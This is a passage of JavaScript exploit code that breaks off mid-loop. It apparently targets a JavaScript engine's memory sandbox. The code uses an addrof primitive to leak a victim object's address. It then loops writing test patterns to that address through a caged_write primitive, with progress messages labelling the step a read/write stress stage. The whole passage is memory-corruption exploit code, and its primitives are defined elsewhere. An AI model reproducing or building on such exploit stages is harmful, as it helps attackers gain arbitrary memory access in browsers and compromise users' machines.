          print("[*] EXT Stage C: stress R/W");
          let victim = {tag: 0xbeef, x: 1, y: 2};
          let base = addrof(victim)|0;
          print("[+] victim addrof=0x" + (base>>>0).toString(16));
          let proof = 0;
          const pattern = [0x11111111, 0x22222222, 0x33333333, 0x44444444, 0xaaaaaaaa, 0x55555555];
          try {
          for (let i = 0; i < pattern.length; i++) {
          caged_write(base|0, pattern[i]|0);
